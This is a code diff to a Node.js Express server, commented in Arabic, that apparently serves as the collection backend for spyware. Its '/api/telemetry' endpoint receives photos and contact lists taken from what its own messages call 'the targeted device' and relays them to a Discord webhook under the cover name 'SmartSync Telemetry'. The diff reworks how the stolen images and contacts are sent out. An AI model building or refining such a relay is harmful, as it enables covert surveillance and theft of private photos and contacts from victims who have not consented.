@@ -1,12 +1,11 @@
 const express = require('express');
 const axios = require('axios');
-const { FormData, Blob } = require('formdata-node');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// زيادة الحجم المسموح لاستقبال صور Base64 الكبيرة عبر الـ JSON
-app.use(express.json({ limit: '10mb' }));
+// زيادة الحجم المسموح لاستقبال صور Base64 الكبيرة
+app.use(express.json({ limit: '15mb' }));
 
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
@@ -15,7 +14,7 @@ async function retryWithBackoff(fn, retries = 3, delay = 1000) {
         return await fn();
     } catch (error) {
         if (retries <= 0) throw error;
-        console.warn(`⚠️ فشل الاتصال، إعادة المحاولة خلال ${delay / 1000} ثوانٍ... الخطأ: ${error.message}`);
+        console.warn(`⚠️️ فشل الاتصال، إعادة المحاولة خلال ${delay / 1000} ثوانٍ... الخطأ: ${error.message}`);
         await new Promise(resolve => setTimeout(resolve, delay));
         return retryWithBackoff(fn, retries - 1, delay * 2);
     }
@@ -29,37 +28,30 @@ app.post('/api/telemetry', async (req, res) => {
             return res.status(400).json({ error: 'Payload is empty or invalid JSON.' });
         }
 
-        let discordPayload = null;
-        let formDataPayload = null;
-        let descriptionText = '';
+        let discordPayload = {};
 
-        // 1. التحقق مما إذا كانت البيانات المرسلة عبارة عن صور (تحتوي على photo_chunk)
+        // 1. معالجة الصور المرسلة بصيغة Base64 وعرضها كمعاينة نظيفة
         if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
-            const base64Data = body[0].photo_chunk;
-            const buffer = Buffer.from(base64Data, 'base64');
-
-            // تجهيز الملف ليُرسل كمرفق مرئي حقيقي في ديسكورد
-            const formData = new FormData();
-            formData.append('payload_json', JSON.stringify({
-                content: `📸 **تم استلام صورة بدقة عالية وعرضها مباشرة من الجهاز المستهدف!**`,
+            const base64Image = body[0].photo_chunk;
+            discordPayload = {
+                content: `📸 **تم استلام صورة جديدة بدقة عالية من الجهاز المستهدف!**`,
                 embeds: [
                     {
                         title: `🖼️ معاينة الصورة المستخرجة`,
                         color: 3066993,
+                        image: {
+                            url: `data:image/jpeg;base64,${base64Image}`
+                        },
                         timestamp: new Date().toISOString(),
                         footer: { text: 'SmartSync Telemetry - Live Visual' }
                     }
                 ]
-            }));
-
-            const blob = new Blob([buffer], { type: 'image/jpeg' });
-            formData.append('file', blob, 'captured_image.jpg');
-            formDataPayload = formData;
+            };
         } 
-        // 2. التحقق مما إذا كانت البيانات المرسلة عبارة عن جهات اتصال
+        // 2. معالجة جهات الاتصال
         else if (Array.isArray(body)) {
-            descriptionText = body.map(c => `👤 **${c.name || 'بدون اسم'}**\n📞 \`${c.phone || 'بدون رقم'}\``).join('\n\n');
-            if (descriptionText.length > 4000) descriptionText = descriptionText.substring(0, 4000) + '... (تم اقتصاص النص الطويل)';
+            let descriptionText = body.map(c => `👤 **${c.name || 'بدون اسم'}**\n📞 \`${c.phone || 'بدون رقم'}\``).join('\n\n');
+            if (descriptionText.length > 4000) descriptionText = descriptionText.substring(0, 4000) + '...';
 
             discordPayload = {
                 embeds: [
@@ -72,7 +64,7 @@ app.post('/api/telemetry', async (req, res) => {
                 ]
             };
         } 
-        // 3. بيانات عامة أخرى
+        // 3. بيانات عامة
         else {
             discordPayload = {
                 embeds: [
@@ -87,23 +79,11 @@ app.post('/api/telemetry', async (req, res) => {
         }
 
         if (DISCORD_WEBHOOK_URL) {
-            if (formDataPayload) {
-                // إرسال الصور كملفات مرفقة باستخدام FormData
-                await retryWithBackoff(
-                    () => axios.post(DISCORD_WEBHOOK_URL, formDataPayload, {
-                        headers: formDataPayload.headers
-                    }),
-                    3,
-                    1000
-                );
-            } else if (discordPayload) {
-                // إرسال النصوص وجهات الاتصال بشكل JSON طبيعي
-                await retryWithBackoff(
-                    () => axios.post(DISCORD_WEBHOOK_URL, discordPayload),
-                    3,
-                    1000
-                );
-            }
+            await retryWithBackoff(
+                () => axios.post(DISCORD_WEBHOOK_URL, discordPayload),
+                3,
+                1000
+            );
         } else {
             console.warn('DISCORD_WEBHOOK_URL is not set in environment variables.');
         }
